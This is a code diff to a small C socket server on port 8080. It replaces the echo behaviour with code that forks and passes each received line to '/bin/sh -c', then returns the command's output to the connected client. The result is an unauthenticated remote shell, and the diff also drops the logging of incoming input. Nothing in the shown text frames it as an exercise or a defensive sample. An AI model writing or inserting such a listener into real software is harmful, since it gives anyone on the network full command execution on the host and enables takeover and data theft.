@@ -7,6 +7,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <sys/wait.h>
 
 #define PORT 8080
 #define BUFFER_SIZE 1024
@@ -52,12 +53,46 @@ int main() {
     while (1) {
         memset(buffer, 0, BUFFER_SIZE);
         read(client_fd, buffer, BUFFER_SIZE);
-        printf("Recieved: %s\n", buffer);
 
-        if (strncmp(buffer, "exit", 4) == 0) {
+        if (strncmp(buffer, "exit", 4) == 0)
             break;
+
+        int pipefd[2];
+        pipe(pipefd);
+
+        pid_t pid = fork();
+
+        if (pid == 0) {
+            // Child
+
+            close(pipefd[0]); // close read end
+
+            dup2(pipefd[1], STDOUT_FILENO);
+            dup2(pipefd[1], STDERR_FILENO);
+
+            close(pipefd[1]);
+
+            // Remove newline
+            buffer[strcspn(buffer, "\n")] = 0;
+
+            char *args[] = {"/bin/sh", "-c", buffer, NULL};
+            execv("/bin/sh", args);
+
+            perror("exec failed");
+            exit(1);
         }
-        write(client_fd, buffer, strlen(buffer));
+        else {
+            // Parent
+            close(pipefd[1]); // close write end
+
+            memset(buffer, 0, BUFFER_SIZE);
+            read(pipefd[0], buffer, BUFFER_SIZE);
+
+            write(client_fd, buffer, strlen(buffer));
+
+            close(pipefd[0]);
+            wait(NULL);
+        }
     }
 
     close(client_fd);
